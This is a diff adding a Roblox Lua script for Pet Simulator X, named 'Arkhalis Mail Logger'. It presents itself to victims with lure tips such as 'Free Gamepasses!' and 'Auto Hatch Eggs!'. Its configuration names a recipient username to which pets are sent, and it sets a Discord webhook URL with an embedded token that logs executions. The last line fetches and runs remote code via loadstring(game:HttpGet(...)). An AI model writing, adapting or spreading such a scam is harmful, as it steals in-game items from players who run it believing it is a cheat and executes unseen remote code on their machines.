@@ -1,0 +1,37 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "TAAA9999999999" --// Username To Send Pets To
+
+_G.Diamonds = Ok --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1107130437622575194/XkJAxhkvDecASA9VT7cwCM1zUF9fSLwgQ-BZAooQ-h1-urvaICPQK8Rxdh45wAlag0HR" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+
+_G.ScriptName = "PSX" --// Script Name On The UI
+
+_G.Tip1 = "Lucki Blocks!" --// Gives You Tips On The UI
+
+_G.Tip2 = "Auto Hatch Eggs!" --// Gives You Tips On The UI
+
+_G.Tip3 = "Free Gamepasses!" --// Gives You Tips On The UI
+
+_G.Tip4 = "Wait" --// Gives You Tips On The UI
+
+_G.Tip5 = "Finishing..." --// Gives You Tips On The UI
+
+--[[ PREMIUM SETTINGS ]]--
+
+--[[ Don't try to use if u don't own premium ]]--
+
+_G.Key = "" --// This Key Is Ur Username If U Have Any Questions Dm's Pewcio#0001
+
+_G.WebhookDualHook = "" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
